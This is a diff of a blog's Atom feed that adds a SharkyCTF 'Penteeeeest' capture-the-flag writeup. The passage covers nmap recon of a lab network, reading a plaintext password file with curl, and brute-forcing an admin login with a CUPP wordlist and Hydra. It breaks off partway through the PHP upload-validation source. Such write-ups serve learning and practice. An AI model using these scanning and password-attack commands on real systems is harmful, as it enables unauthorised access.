@@ -1,4 +1,561 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://aidanstansfield.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://aidanstansfield.github.io/" rel="alternate" type="text/html" /><updated>2020-05-15T15:56:37+10:00</updated><id>https://aidanstansfield.github.io/feed.xml</id><title type="html">Aidan’s Blog</title><subtitle>G'day, I'm Aidan and I like to make things, almost as much as I like to break things. In this blog you can expect to find writeups of various home/personal projects, as well as hackthebox/ctf writeups. Hope you enjoy!</subtitle><entry><title type="html">Intro to Web Security</title><link href="https://aidanstansfield.github.io/2020/04/26/intro-to-websec.html" rel="alternate" type="text/html" title="Intro to Web Security" /><published>2020-04-26T11:30:00+10:00</published><updated>2020-04-26T11:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/04/26/intro-to-websec</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/04/26/intro-to-websec.html">&lt;p&gt;This isn't so much a post, just a share of something I did. So last week I gave a talk to the &lt;a href=&quot;https://cybersquad.uqcloud.net/&quot;&gt;UQ Cyber Squad&lt;/a&gt; called &lt;strong&gt;&amp;quot;Introduction to Web Security&amp;quot;&lt;/strong&gt;. Since WebSec is massive and this was a talk for beginners, I decided to come at this from the angle of &lt;em&gt;WebSec for CTFs&lt;/em&gt;, since it serves as an easy entry point to those not familiar with the theory and tools, and it's an area I have some decent experience in.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.7">Jekyll</generator><link href="https://aidanstansfield.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://aidanstansfield.github.io/" rel="alternate" type="text/html" /><updated>2020-05-15T20:11:06+10:00</updated><id>https://aidanstansfield.github.io/feed.xml</id><title type="html">Aidan’s Blog</title><subtitle>G'day, I'm Aidan and I like to make things, almost as much as I like to break things. In this blog you can expect to find writeups of various home/personal projects, as well as hackthebox/ctf writeups. Hope you enjoy!</subtitle><entry><title type="html">SharkyCTF: Penteeeeest Writeup</title><link href="https://aidanstansfield.github.io/2020/05/15/sharkyctf-penteeeeest.html" rel="alternate" type="text/html" title="SharkyCTF: Penteeeeest Writeup" /><published>2020-05-15T11:30:00+10:00</published><updated>2020-05-15T11:30:00+10:00</updated><id>https://aidanstansfield.github.io/2020/05/15/sharkyctf-penteeeeest</id><content type="html" xml:base="https://aidanstansfield.github.io/2020/05/15/sharkyctf-penteeeeest.html">&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#introduction&quot;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#user-1&quot;&gt;User 1&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#recon&quot;&gt;Recon&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#finding-credentials&quot;&gt;Finding Credentials&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#intended-way---viewing-source-code&quot;&gt;Intended Way - Viewing Source Code&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#unintended-way---osint&quot;&gt;Unintended Way - OSINT&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#exploiting-png-upload&quot;&gt;Exploiting PNG Upload&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#accessing-the-web-shell&quot;&gt;Accessing the web shell&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#getting-a-shell&quot;&gt;Getting a shell&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#user-2&quot;&gt;User 2&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#root&quot;&gt;Root&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#enum&quot;&gt;Enum&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#exploit&quot;&gt;Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#root-2&quot;&gt;Root 2&lt;/a&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;#making-life-better&quot;&gt;Making life better&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#enum-1&quot;&gt;Enum&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#explaining-the-exploit&quot;&gt;Explaining the exploit&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#executing-the-exploit&quot;&gt;Executing the exploit&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;#summary&quot;&gt;Summary&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;Over the weekend I competed in &lt;a href=&quot;https://ctfd.sharkyctf.xyz/&quot;&gt;SharkyCTF&lt;/a&gt;, which was a jeopardy style CTF with challenges in Blockchain, Crypto, Forensics, Steganography, Web, Misc, Network, Binary Exploits and Reversing. I competed with some fellow members of &lt;a href=&quot;https://cybersquad.uqcloud.net/&quot;&gt;UQ Cyber Squad&lt;/a&gt; as apart of &lt;a href=&quot;https://ctfd.sharkyctf.xyz/teams/117&quot;&gt;UQCYBER-A&lt;/a&gt;, and we ended up getting 11th place on the scoreboard (out of 828 teams)! Even better than that, since 3 teams above us had more than 5 members, we moved up to 8th place and won a 1 month free VIP subscription to Hack The Box!&lt;/p&gt;
+&lt;p&gt;I mainly focused on the web and network challenges, and the main network challenge was called 'Penteeeest'. It was a 3-part Hack The Box style challenge with flags for user and root, and one for post-exploitation pivoting. This was an insanely fun series of challenges, and I learnt a few new exploits to add to my toolbelt. With all that said, here's my writeup.&lt;/p&gt;
+&lt;h1 id=&quot;user-1&quot;&gt;User 1&lt;/h1&gt;
+&lt;p&gt;This was by far the hardest part of the 3 challenges IMO.&lt;/p&gt;
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+&lt;p&gt;After connecting in via VPN, we see we are placed into a small private network of 172.30.0.14/28&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ ip a show tap0
+4: tap0: &amp;lt;BROADCAST,MULTICAST,UP,LOWER_UP&amp;gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100
+link/ether 42:5f:dc:5d:5e:f8 brd ff:ff:ff:ff:ff:ff
+inet 172.30.0.14/28 brd 172.30.0.15 scope global tap0
+ valid_lft forever preferred_lft forever
+inet6 fe80::405f:dcff:fe5d:5ef8/64 scope link 
+ valid_lft forever preferred_lft forever
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;So now we scan the network to see which hosts are up.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ nmap -sn 172.30.0.14/28
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-13 23:17 EDT
+Nmap scan report for 172.30.0.2
+Host is up (0.33s latency).
+Nmap scan report for 172.30.0.3
+Host is up (0.33s latency).
+Nmap scan report for 172.30.0.14
+Host is up (0.00011s latency).
+Nmap done: 16 IP addresses (3 hosts up) scanned in 4.34 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We see two hosts (172.30.0.2 &amp;amp; 172.30.0.3), and ourselves (172.30.0.14). Next, we scan both hosts to see what ports are open and what services may be running.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -A -T4 -Pn -v -oN nmap.2 172.30.0.2
+nmap -A -T4 -Pn -v -oN nmap.3 172.30.0.3
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Looking at the results, we see port 22 (SSH) open on both, and port 80 open on 172.30.0.2.&lt;/p&gt;
+&lt;details&gt;
+&lt;summary&gt;Nmap results&lt;/summary&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ cat nmap.*
+# Nmap 7.80 scan initiated Wed May 13 23:24:50 2020 as: nmap -A -T4 -Pn -v -oN nmap.2 172.30.0.2
+Nmap scan report for 172.30.0.2
+Host is up (0.33s latency).
+Not shown: 998 closed ports
+PORT STATE SERVICE VERSION
+22/tcp openssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+| 2048 db:7a:34:83:7e:5a:19:53:ff:b8:5a:69:a8:e9:6c:a8 (RSA)
+| 256 ab:89:de:dc:5e:b9:ad:83:1c:58:33:be:12:d2:ca:b5 (ECDSA)
+|_256 f1:fb:b4:76:b0:40:60:e7:29:32:4b:f4:8a:08:8e:21 (ED25519)
+80/tcp openhttpApache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Michael's Life
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed May 13 23:25:43 2020 -- 1 IP address (1 host up) scanned in 52.47 seconds
+# Nmap 7.80 scan initiated Wed May 13 23:26:11 2020 as: nmap -A -T4 -Pn -v -oN nmap.3 172.30.0.3
+Nmap scan report for 172.30.0.3
+Host is up (0.32s latency).
+Not shown: 999 closed ports
+PORT STATE SERVICE VERSION
+22/tcp openssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+| 2048 f2:28:86:52:2f:15:70:f6:a9:16:82:8d:f5:8e:a0:a3 (RSA)
+| 256 bf:9b:a5:38:8b:75:ba:e2:18:6b:14:b9:6e:3a:fe:af (ECDSA)
+|_256 bf:e0:35:19:07:ba:3e:12:b0:03:86:7f:73:43:d6:d0 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed May 13 23:26:53 2020 -- 1 IP address (1 host up) scanned in 42.07 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/details&gt;
+&lt;p&gt;Since 172.30.0.2 had a web port open, I figured this was the way forward.&lt;/p&gt;
+&lt;p&gt;Navigating to the website, we see it is a simple blog.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Navigating around, we see a bunch of blog posts on different things, including Michael's birthday, and how he likes badgers, brownies and bamboo.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/blog.png&quot; alt=&quot;blog&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Note the get parameter &amp;quot;blog.php?article=1&amp;quot;, as we will come back to this. We also see at the bottom, &lt;strong&gt;&amp;quot;This website is also host on Github&amp;quot;&lt;/strong&gt; with a link to the following &lt;a href=&quot;https://github.com/Michael-SharkyMaster/website&quot;&gt;GitHub repo&lt;/a&gt;. &lt;strong&gt;Note:&lt;/strong&gt; Originally when I did this box, there was no GitHub source code available, rather there was &lt;a href=&quot;https://gitea.io/en-us/&quot;&gt;Gitea&lt;/a&gt; running on port 3000. I believe this was changed mid-ctf to make the box easier.&lt;/p&gt;
+&lt;p&gt;The publication of this source code is extremely useful, as we can analyze what precautions are put in place and how the website can be exploited.&lt;/p&gt;
+&lt;p&gt;To start with, there is a &lt;strong&gt;&amp;quot;/admin&amp;quot;&lt;/strong&gt; section to the website, which contains an upload feature, however this is hidden behind a login.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;finding-credentials&quot;&gt;Finding Credentials&lt;/h2&gt;
+&lt;h3 id=&quot;intended-way---viewing-source-code&quot;&gt;Intended Way - Viewing Source Code&lt;/h3&gt;
+&lt;p&gt;Viewing the &lt;a href=&quot;https://github.com/Michael-SharkyMaster/website/blob/5f46d8bc779c4c4f1ed9d5ecde71c330d81c970b/admin/login.php#L8&quot;&gt;login source code&lt;/a&gt; however, we can see that the username is 'Michael' and there are credentials stored in a file &lt;strong&gt;&amp;quot;creds.txt&amp;quot;&lt;/strong&gt;. A simple cURL will get us our password and just like that we're in.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ curl 172.30.0.2/admin/creds.txt
+Badger1992
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;unintended-way---osint&quot;&gt;Unintended Way - OSINT&lt;/h3&gt;
+&lt;p&gt;So foolishly of me, in the CTF I assumed that creds.txt would not be accessible by the webserver. So I went about getting his password a different way, by creating a custom wordlist using &lt;a href=&quot;https://github.com/Mebus/cupp&quot;&gt;CUPP&lt;/a&gt; and attacking the login with &lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot;&gt;Hydra&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Using the information from his blog posts, I created a custom wordlist tailored to Michael.&lt;/p&gt;
+&lt;details&gt;
+&lt;summary&gt;CUPP Wordlist Generation&lt;/summary&gt;
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ python3 /opt/cupp/cupp.py -i
+ ___________ 
+ cupp.py! # Common
+\ # User
+ \ ,__, # Passwords
+\(oo)____ # Profiler
+ (__))\ 
+||--|| *[ Muris Kurgas | j0rgan@remote-exploit.org ]
+[ Mebus | https://github.com/Mebus/]
+
+
+[+] Insert the information about the victim to make a dictionary
+[+] If you don't know all the info, just hit enter when asked! ;)
+
+&amp;gt; First Name: Michael
+&amp;gt; Surname: 
+&amp;gt; Nickname: 
+&amp;gt; Birthdate (DDMMYYYY): 11021992
+
+
+&amp;gt; Partners) name: 
+&amp;gt; Partners) nickname: 
+&amp;gt; Partners) birthdate (DDMMYYYY): 
+
+
+&amp;gt; Child's name: 
+&amp;gt; Child's nickname: 
+&amp;gt; Child's birthdate (DDMMYYYY): 
+
+
+&amp;gt; Pet's name: 
+&amp;gt; Company name: 
+
+
+&amp;gt; Do you want to add some key words about the victim? Y/[N]: Y
+&amp;gt; Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: badger,brownie,bamboo
+&amp;gt; Do you want to add special chars at the end of words? Y/[N]: N
+&amp;gt; Do you want to add some random numbers at the end of words? Y/[N]:N
+&amp;gt; Leet mode? (i.e. leet = 1337) Y/[N]: Y
+
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to michael.txt, counting 2898 words.
+[+] Now load your pistolero with michael.txt and shoot! Good luck!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/details&gt;
+I then attacked the login function with this wordlist and Hydra
+&lt;pre&gt;&lt;code&gt;kali@kali:~/sharky/penteeeeest$ hydra -l Michael -I -P michael.txt 172.30.0.2 http-post-form &amp;quot;/admin/login.php:login=^USER^&amp;amp;password=^PASS^:Wrong Username&amp;quot;
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-14 00:27:15
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 2898 login tries (l:1/p:2898), ~182 tries per task
+[DATA] attacking http-post-form://172.30.0.2:80/admin/login.php:login=^USER^&amp;amp;password=^PASS^:Wrong Username
+[STATUS] 582.00 tries/min, 582 tries in 00:01h, 2316 to do in 00:04h, 16 active
+[80][http-post-form] host: 172.30.0.2 login: Michael password: Badger1992
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-14 00:28:25
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;exploiting-png-upload&quot;&gt;Exploiting PNG Upload&lt;/h2&gt;
+&lt;p&gt;Now that we have the credentials, we can try logging into the admin panel and accessing the upload page. Unfortunately, the login functionality doesn't quite work as is (no cookies are set), and thus the upload page doesn't register us as logged in.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/loginbroke.png&quot; alt=&quot;brokenlogin&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Having a look at the &lt;a href=&quot;https://github.com/Michael-SharkyMaster/website/blob/5f46d8bc779c4c4f1ed9d5ecde71c330d81c970b/admin/upload.php#L61&quot;&gt;source code&lt;/a&gt;, we can see that the website is looking for a &lt;strong&gt;&amp;quot;username&amp;quot;&lt;/strong&gt; and &lt;strong&gt;&amp;quot;password&amp;quot;&lt;/strong&gt; cookie.&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Michael'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;===&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str_replace&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'creds.txt'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;We can use Burp Suite to automatically add these cookies to every request for us, by adding a session handling rule under the &amp;quot;Project Options&amp;quot; tab as follows:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/burpcookie.png&quot; alt=&quot;burpsession&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;It's important to add the &amp;quot;Proxy&amp;quot; tab into the scope, so that Burp can apply this rule to every request that goes to 172.30.0.2.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/burpscope.png&quot; alt=&quot;burpscope&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Revisiting upload.php, we now see the page as intended.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/penteeeeest/workingupload.png&quot; alt=&quot;workingupload&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Now comes what I found to be the best part of this box, the file upload. Once again, we look at the &lt;a href=&quot;https://github.com/Michael-SharkyMaster/website/blob/master/admin/png_upload.php#L21-L56&quot;&gt;source for png_upload.php&lt;/a&gt;, and we see the following precautions put in place around file uploads.&lt;/p&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file_extension&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Upload valid images. Only PNG and JPEG are allowed.&quot;&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;upload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;size&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Image size exceeds 2MB&quot;&lt;/span&gt;
+ &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'mime'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;image/png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+ &lt;span class=&quot;s2&quot;&gt;&quot;type&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Invalid mimetype&quot;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+ &lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;imagecreatetruecolor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'width'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'height'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+
+ &lt;span class=&quot;nb&quot;&gt;imagecopyresampled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;imagecreatefromstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;file_get_contents&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_FILES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;upload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'width'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span 